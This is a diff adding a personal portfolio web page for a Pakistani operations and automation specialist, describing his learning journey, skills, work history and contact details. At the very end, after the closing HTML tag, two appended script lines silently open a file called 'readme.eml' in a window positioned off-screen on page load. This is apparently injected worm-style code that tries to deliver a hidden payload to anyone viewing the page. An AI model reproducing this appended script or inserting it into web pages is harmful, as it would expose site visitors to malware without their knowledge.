@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Muhammad Abrar Hassan — Business Process & Operations Automation Specialist</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Grotesk:wght@400;500;700&display=swap');
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --navy: #0F1F3D;
+    --blue: #1A3A6B;
+    --accent: #2563EB;
+    --accent-light: #3B82F6;
+    --gold: #F59E0B;
+    --white: #FFFFFF;
+    --off-white: #F8FAFC;
+    --gray: #64748B;
+    --light-gray: #E2E8F0;
+    --text: #1E293B;
+  }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    background: var(--off-white);
+    color: var(--text);
+    line-height: 1.6;
+  }
+
+  /* NAV */
+  nav {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+    background: rgba(15, 31, 61, 0.95);
+    backdrop-filter: blur(10px);
+    padding: 0 2rem;
+    display: flex; align-items: center; justify-content: space-between;
+    height: 64px;
+  }
+  .nav-brand {
+    font-family: 'Space Grotesk', sans-serif;
+    font-weight: 700; font-size: 1rem;
+    color: var(--white); letter-spacing: 0.02em;
+  }
+  .nav-links { display: flex; gap: 2rem; }
+  .nav-links a {
+    color: rgba(255,255,255,0.7); text-decoration: none;
+    font-size: 0.875rem; font-weight: 500;
+    transition: color 0.2s;
+  }
+  .nav-links a:hover { color: var(--white); }
+
+  /* HERO */
+  .hero {
+    min-height: 100vh;
+    background: linear-gradient(135deg, var(--navy) 0%, var(--blue) 60%, #1E40AF 100%);
+    display: flex; align-items: center;
+    padding: 80px 2rem 4rem;
+    position: relative; overflow: hidden;
+  }
+  .hero::before {
+    content: '';
+    position: absolute; inset: 0;
+    background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+  }
+  .hero-inner {
+    max-width: 1100px; margin: 0 auto;
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: 4rem; align-items: center;
+    position: relative; z-index: 1;
+  }
+  .hero-badge {
+    display: inline-flex; align-items: center; gap: 0.5rem;
+    background: rgba(37, 99, 235, 0.3);
+    border: 1px solid rgba(59, 130, 246, 0.4);
+    border-radius: 100px; padding: 0.375rem 1rem;
+    color: #93C5FD; font-size: 0.8rem; font-weight: 500;
+    margin-bottom: 1.5rem;
+  }
+  .hero-badge::before { content: '●'; color: var(--gold); font-size: 0.6rem; }
+  .hero h1 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: clamp(2rem, 4vw, 3rem);
+    font-weight: 700; color: var(--white);
+    line-height: 1.15; margin-bottom: 1rem;
+  }
+  .hero h1 span { color: var(--gold); }
+  .hero-subtitle {
+    color: rgba(255,255,255,0.75); font-size: 1.05rem;
+    margin-bottom: 2rem; max-width: 480px;
+  }
+  .hero-cta {
+    display: flex; gap: 1rem; flex-wrap: wrap;
+  }
+  .btn-primary {
+    background: var(--accent); color: white;
+    padding: 0.75rem 1.75rem; border-radius: 8px;
+    text-decoration: none; font-weight: 600; font-size: 0.9rem;
+    transition: background 0.2s, transform 0.2s;
+    display: inline-block;
+  }
+  .btn-primary:hover { background: var(--accent-light); transform: translateY(-1px); }
+  .btn-outline {
+    border: 1.5px solid rgba(255,255,255,0.4); color: white;
+    padding: 0.75rem 1.75rem; border-radius: 8px;
+    text-decoration: none; font-weight: 500; font-size: 0.9rem;
+    transition: border-color 0.2s, transform 0.2s;
+    display: inline-block;
+  }
+  .btn-outline:hover { border-color: white; transform: translateY(-1px); }
+
+  /* HERO STATS */
+  .hero-stats {
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+  }
+  .stat-card {
+    background: rgba(255,255,255,0.08);
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 12px; padding: 1.5rem;
+    backdrop-filter: blur(10px);
+  }
+  .stat-number {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 2rem; font-weight: 700;
+    color: var(--gold); line-height: 1;
+    margin-bottom: 0.25rem;
+  }
+  .stat-label { color: rgba(255,255,255,0.65); font-size: 0.8rem; }
+
+  /* SECTIONS */
+  section { padding: 5rem 2rem; }
+  .section-inner { max-width: 1100px; margin: 0 auto; }
+  .section-label {
+    font-size: 0.75rem; font-weight: 600; letter-spacing: 0.12em;
+    text-transform: uppercase; color: var(--accent);
+    margin-bottom: 0.75rem;
+  }
+  .section-title {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: clamp(1.75rem, 3vw, 2.5rem);
+    font-weight: 700; color: var(--navy);
+    margin-bottom: 1rem;
+  }
+  .section-desc { color: var(--gray); max-width: 600px; font-size: 1.05rem; }
+
+  /* JOURNEY */
+  .journey { background: white; }
+  .journey-grid {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 1.5rem; margin-top: 3rem;
+  }
+  .journey-card {
+    border: 1px solid var(--light-gray); border-radius: 12px;
+    padding: 1.75rem; position: relative;
+    transition: box-shadow 0.2s, transform 0.2s;
+  }
+  .journey-card:hover { box-shadow: 0 8px 30px rgba(0,0,0,0.08); transform: translateY(-2px); }
+  .day-badge {
+    display: inline-block;
+    background: var(--navy); color: var(--gold);
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 0.75rem; font-weight: 700;
+    padding: 0.25rem 0.75rem; border-radius: 100px;
+    margin-bottom: 1rem;
+  }
+  .journey-card h3 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1rem; font-weight: 700;
+    color: var(--navy); margin-bottom: 0.5rem;
+  }
+  .journey-card p { color: var(--gray); font-size: 0.875rem; line-height: 1.6; }
+  .journey-card .takeaway {
+    margin-top: 1rem; padding: 0.75rem;
+    background: #EFF6FF; border-left: 3px solid var(--accent);
+    border-radius: 0 6px 6px 0;
+    font-size: 0.8rem; color: var(--blue); font-style: italic;
+  }
+
+  /* SKILLS */
+  .skills { background: var(--off-white); }
+  .skills-grid {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 1.5rem; margin-top: 3rem;
+  }
+  .skill-card {
+    background: white; border-radius: 12px;
+    padding: 1.75rem; border: 1px solid var(--light-gray);
+    transition: box-shadow 0.2s;
+  }
+  .skill-card:hover { box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
+  .skill-icon {
+    width: 48px; height: 48px; border-radius: 10px;
+    background: linear-gradient(135deg, var(--navy), var(--blue));
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.25rem; margin-bottom: 1rem;
+  }
+  .skill-card h3 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 0.95rem; font-weight: 700;
+    color: var(--navy); margin-bottom: 0.5rem;
+  }
+  .skill-card p { color: var(--gray); font-size: 0.85rem; }
+  .skill-tags { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 1rem; }
+  .tag {
+    background: #EFF6FF; color: var(--accent);
+    font-size: 0.72rem; font-weight: 600;
+    padding: 0.2rem 0.6rem; border-radius: 100px;
+  }
+
+  /* BACKGROUND */
+  .background { background: white; }
+  .bg-card {
+    background: linear-gradient(135deg, var(--navy) 0%, var(--blue) 100%);
+    border-radius: 16px; padding: 2.5rem;
+    color: white; margin-top: 3rem;
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: 3rem; align-items: start;
+  }
+  .bg-card h3 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1.3rem; font-weight: 700;
+    color: var(--gold); margin-bottom: 1rem;
+  }
+  .bg-card p { color: rgba(255,255,255,0.8); font-size: 0.9rem; margin-bottom: 1rem; }
+  .bg-list { list-style: none; }
+  .bg-list li {
+    color: rgba(255,255,255,0.8); font-size: 0.875rem;
+    padding: 0.5rem 0; border-bottom: 1px solid rgba(255,255,255,0.1);
+    display: flex; align-items: center; gap: 0.75rem;
+  }
+  .bg-list li::before { content: '✓'; color: var(--gold); font-weight: 700; }
+
+  /* PHILOSOPHY */
+  .philosophy { background: var(--navy); }
+  .philosophy .section-title { color: white; }
+  .philosophy .section-desc { color: rgba(255,255,255,0.65); }
+  .principles {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 1.5rem; margin-top: 3rem;
+  }
+  .principle {
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 12px; padding: 1.75rem;
+    background: rgba(255,255,255,0.05);
+  }
+  .principle-num {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 2.5rem; font-weight: 700;
+    color: rgba(245, 158, 11, 0.3); line-height: 1;
+    margin-bottom: 0.5rem;
+  }
+  .principle h3 {
+    font-family: 'Space Grotesk', sans-serif;
+    color: white; font-size: 1rem; margin-bottom: 0.5rem;
+  }
+  .principle p { color: rgba(255,255,255,0.6); font-size: 0.875rem; }
+
+  /* CONTACT */
+  .contact { background: white; text-align: center; }
+  .contact-card {
+    max-width: 600px; margin: 3rem auto 0;
+    background: linear-gradient(135deg, var(--navy), var(--blue));
+    border-radius: 16px; padding: 3rem;
+    color: white;
+  }
+  .contact-card h3 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1.5rem; color: var(--gold); margin-bottom: 0.5rem;
+  }
+  .contact-card p { color: rgba(255,255,255,0.75); margin-bottom: 1.5rem; }
+  .contact-links { display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; }
+  .contact-link {
+    background: rgba(255,255,255,0.1);
+    border: 1px solid rgba(255,255,255,0.2);
+    color: white; text-decoration: none;
+    padding: 0.6rem 1.25rem; border-radius: 8px;
+    font-size: 0.875rem; font-weight: 500;
+    transition: background 0.2s;
+  }
+  .contact-link:hover { background: rgba(255,255,255,0.2); }
+
+  /* FOOTER */
+  footer {
+    background: var(--navy); color: rgba(255,255,255,0.5);
+    text-align: center; padding: 1.5rem;
+    font-size: 0.8rem;
+  }
+
+  /* RESPONSIVE */
+  @media (max-width: 768px) {
+    .hero-inner { grid-template-columns: 1fr; gap: 3rem; }
+    .hero-stats { grid-template-columns: 1fr 1fr; }
+    .bg-card { grid-template-columns: 1fr; gap: 2rem; }
+    .nav-links { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-brand">Muhammad Abrar Hassan</div>
+  <div class="nav-links">
+    <a href="#journey">Learning Journey</a>
+    <a href="#skills">Skills</a>
+    <a href="#background">Background</a>
+    <a href="#contact">Contact</a>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <div class="hero-badge">Actively Learning — Day 7 & Counting</div>
+      <h1>Business Process &amp; <span>Operations Automation</span> Specialist</h1>
+      <p class="hero-subtitle">
+        I help businesses identify bottlenecks, eliminate manual inefficiencies, and build automated systems that create real, measurable outcomes — not just technical workflows.
+      </p>
+      <div class="hero-cta">
+        <a href="#journey" class="btn-primary">View My Journey</a>
+        <a href="#contact" class="btn-outline">Let's Connect</a>
+      </div>
+    </div>
+    <div class="hero-stats">
+      <div class="stat-card">
+        <div class="stat-number">13+</div>
+        <div class="stat-label">Years of Operations Experience</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-number">7</div>
+        <div class="stat-label">Consecutive Learning Days</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-number">150+</div>
+        <div class="stat-label">Retailer Accounts Managed</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-number">PKR 10L</div>
+        <div class="stat-label">Daily Cash Reconciled</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- JOURNEY -->
+<section class="journey" id="journey">
+  <div class="section-inner">
+    <div class="section-label">Learning in Public</div>
+    <h2 class="section-title">My Automation Journey</h2>
+    <p class="section-desc">Every day I learn, apply, and share. Here is what I have covered so far — building from business thinking to technical execution.</p>
+
+    <div class="journey-grid">
+
+      <div class="journey-card">
+        <span class="day-badge">DAY 1</span>
+        <h3>Automation Mindset & Business Process Thinking</h3>
+        <p>Learned that businesses are not collections of people and software — they are collections of processes. Analyzed Clinic, Real Estate, and E-commerce workflows using the 5 core questions framework.</p>
+        <div class="takeaway">"Technology is not the starting point. Understanding business processes is."</div>
+      </div>
+
+      <div class="journey-card">
+        <span class="day-badge">DAY 2</span>
+        <h3>APIs — How Systems Communicate</h3>
+        <p>Understood that behind every automation, CRM, dashboard, and AI workflow is an API. Learned GET vs POST, Request/Response cycle, and Authentication — all through a business lens.</p>
+        <div class="takeaway">"The best specialists don't start with tools. They start with business outcomes."</div>
+      </div>
+
+      <div class="journey-card">
+        <span class="day-badge">DAY 3</span>
+        <h3>JSON, Webhooks & Reliable Data Flow</h3>
+        <p>Discovered that automation is about moving the right data to the right place at the right time. Mapped real workflows for Real Estate and E-commerce. Learned that real systems must handle failures, not just happy paths.</p>
+        <div class="takeaway">"A Business Process Specialist designs reliable processes — not just functional ones."</div>
+      </div>
+
+      <div class="journey-card">
+        <span class="day-badge">DAY 4</span>
+        <h3>Decision-Making Systems & Workflow Logic</h3>
+        <p>Learned IF/ELSE thinking, lead scoring, lead qualification, and decision trees. Built a complete lead prioritization system for a real estate business — Hot, Warm, and Cold classification.</p>
+        <div class="takeaway">"A Business Process Specialist doesn't automate tasks. They automate decisions."</div>
+      </div>
+
+      <div class="journey-card">
+        <span class="day-badge">DAY 5</span>
+        <h3>SOPs, Process Mapping & Root Cause Analysis</h3>
+        <p>Learned that you cannot improve — and definitely should not automate — a process that isn't properly documented. Practiced diagnosing operational problems by separating symptoms from root causes.</p>
+        <div class="takeaway">"Don't automate chaos. Create efficient, repeatable, and scalable systems first."</div>
+      </div>
+
+      <div class="journey-card">
+        <span class="day-badge">DAY 6</span>
+        <h3>Metrics, KPIs & Performance Measurement</h3>
+        <p>Learned the difference between Metrics and KPIs. Analyzed business funnels using data — identifying where the biggest drops occur before proposing any solution.</p>
+        <div class="takeaway">"If you can't measure a process, you can't improve it."</div>
+      </div>
+
+      <div class="journey-card">
+        <span class="day-badge">DAY 7</span>
+        <h3>Automation Opportunities & ROI Thinking</h3>
+        <p>Learned that businesses don't buy automation — they buy outcomes. Identified the 4 characteristics of the best automation opportunities: High Volume, Repetitive Work, Time Consumption, and Direct Business Impact.</p>
+        <div class="takeaway">"Before asking what to automate, ask what business problem you are solving."</div>
+      </div>
+
+      <div class="journey-card">
+        <span class="day-badge">DAY 8</span>
+        <h3>Lean Thinking, Waste Identification & Process Improvement</h3>
+        <p>Learned that not every problem requires more staff or more software. Sometimes the real issue is simply an inefficient process. Explored 7 types of waste: duplicate data entry, unnecessary approvals, manual follow-ups, poor lead qualification, and waiting time between steps.</p>
+        <div class="takeaway">"Business improvement starts with understanding the process, not with implementing a tool."</div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- SKILLS -->
+<section class="skills" id="skills">
+  <div class="section-inner">
+    <div class="section-label">Capabilities</div>
+    <h2 class="section-title">What I Bring to the Table</h2>
+    <p class="section-desc">A rare combination of 13 years of real operations experience and modern automation skills — built for SMEs in Pakistan and the Gulf.</p>
+
+    <div class="skills-grid">
+      <div class="skill-card">
+        <div class="skill-icon">⚙️</div>
+        <h3>Business Process Analysis</h3>
+        <p>Identifying bottlenecks, revenue leaks, and improvement opportunities before proposing any technical solution.</p>
+        <div class="skill-tags">
+          <span class="tag">Process Mapping</span>
+          <span class="tag">SOP Design</span>
+          <span class="tag">Root Cause Analysis</span>
+        </div>
+      </div>
+
+      <div class="skill-card">
+        <div class="skill-icon">🔗</div>
+        <h3>Workflow Automation</h3>
+        <p>Building automated systems using n8n that connect business tools and eliminate manual, repetitive work.</p>
+        <div class="skill-tags">
+          <span class="tag">n8n</span>
+          <span class="tag">Webhooks</span>
+          <span class="tag">API Integration</span>
+        </div>
+      </div>
+
+      <div class="skill-card">
+        <div class="skill-icon">📱</div>
+        <h3>WhatsApp Business Automation</h3>
+        <p>Automating lead responses, customer follow-ups, and notifications via WhatsApp Cloud API for Gulf SMEs.</p>
+        <div class="skill-tags">
+          <span class="tag">WhatsApp API</span>
+          <span class="tag">Lead Management</span>
+          <span class="tag">CRM Integration</span>
+        </div>
+      </div>
+
+      <div class="skill-card">
+        <div class="skill-icon">📊</div>
+        <h3>KPIs & Performance Measurement</h3>
+        <p>Defining the right metrics, building dashboards, and helping businesses make data-driven decisions.</p>
+        <div class="skill-tags">
+          <span class="tag">KPI Design</span>
+          <span class="tag">Funnel Analysis</span>
+          <span class="tag">Reporting</span>
+        </div>
+      </div>
+
+      <div class="skill-card">
+        <div class="skill-icon">🏭</div>
+        <h3>Inventory & Supply Chain Ops</h3>
+        <p>13 years of hands-on experience with GRN processing, stock reconciliation, FIFO, and QuickBooks.</p>
+        <div class="skill-tags">
+          <span class="tag">QuickBooks</span>
+          <span class="tag">Inventory Control</span>
+          <span class="tag">Cash Reconciliation</span>
+        </div>
+      </div>
+
+      <div class="skill-card">
+        <div class="skill-icon">🧠</div>
+        <h3>Decision System Design</h3>
+        <p>Building IF/ELSE logic, lead scoring models, and qualification frameworks that automate business decisions.</p>
+        <div class="skill-tags">
+          <span class="tag">Lead Scoring</span>
+          <span class="tag">Decision Trees</span>
+          <span class="tag">Business Rules</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BACKGROUND -->
+<section class="background" id="background">
+  <div class="section-inner">
+    <div class="section-label">Professional Background</div>
+    <h2 class="section-title">13 Years of Real Operations</h2>
+    <p class="section-desc">My automation thinking is grounded in real-world operations experience — not just theory.</p>
+
+    <div class="bg-card">
+      <div>
+        <h3>Butt Shoes Company</h3>
+        <p>Authorised Distributor — Bata Pakistan Ltd, Faisalabad</p>
+        <p><strong style="color:rgba(255,255,255,0.9)">Warehouse In-charge & Accounts Operator</strong><br>January 2013 – Present</p>
+        <p>Running the complete warehouse and accounts cycle for a high-volume distribution business — independently managing operations that most companies assign to multiple departments.</p>
+      </div>
+      <div>
+        <h3 style="color: var(--gold); font-family: 'Space Grotesk', sans-serif; margin-bottom: 1rem;">Daily Responsibilities</h3>
+        <ul class="bg-list">
+          <li>GRN verification & inbound stock receiving</li>
+          <li>QuickBooks POS & Enterprise — daily operations</li>
+          <li>150–200 retailer accounts & ledger management</li>
+          <li>PKR 5–10 lakh daily cash reconciliation</li>
+          <li>Outbound dispatch & invoice generation</li>
+          <li>Month-end supplier invoice matching</li>
+          <li>Claims & returns processing</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PHILOSOPHY -->
+<section class="philosophy">
+  <div class="section-inner">
+    <div class="section-label" style="color: var(--gold);">How I Think</div>
+    <h2 class="section-title">Core Principles</h2>
+    <p class="section-desc">These are not just lessons — they are the foundation of how I approach every business problem.</p>
+
+    <div class="principles">
+      <div class="principle">
+        <div class="principle-num">01</div>
+        <h3>Diagnose Before You Prescribe</h3>
+        <p>Never propose automation before fully understanding the process. Symptoms and root causes are different things.</p>
+      </div>
+      <div class="principle">
+        <div class="principle-num">02</div>
+        <h3>Businesses Buy Outcomes, Not Automation</h3>
+        <p>The goal is always revenue, speed, fewer errors, or better experience — not a more advanced workflow.</p>
+      </div>
+      <div class="principle">
+        <div class="principle-num">03</div>
+        <h3>Measure Before You Improve</h3>
+        <p>If you cannot measure a process, you cannot improve it. Data reveals where the real problems are.</p>
+      </div>
+      <div class="principle">
+        <div class="principle-num">04</div>
+        <h3>Reliable Over Impressive</h3>
+        <p>A system that handles failures, alerts, and edge cases is worth more than one that only works perfectly.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CONTACT -->
+<section class="contact" id="contact">
+  <div class="section-inner">
+    <div class="section-label">Get In Touch</div>
+    <h2 class="section-title">Let's Work Together</h2>
+    <p class="section-desc" style="margin: 0 auto;">If you want to automate your business operations or discuss a process improvement project, I would love to connect.</p>
+
+    <div class="contact-card">
+      <h3>Muhammad Abrar Hassan</h3>
+      <p>Business Process & Operations Automation Specialist<br>Faisalabad, Pakistan — Open to Gulf Opportunities</p>
+      <div class="contact-links">
+        <a href="mailto:abrar_hassan@hotmail.com" class="contact-link">📧 Email</a>
+        <a href="https://www.linkedin.com/in/muhammad-abrar-hassan-310810a8" class="contact-link" target="_blank">💼 LinkedIn</a>
+        <a href="tel:+923007916077" class="contact-link">📞 +92 300 7916077</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <p>© 2026 Muhammad Abrar Hassan · Business Process & Operations Automation Specialist · Faisalabad, Pakistan</p>
+</footer>
+
+</body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
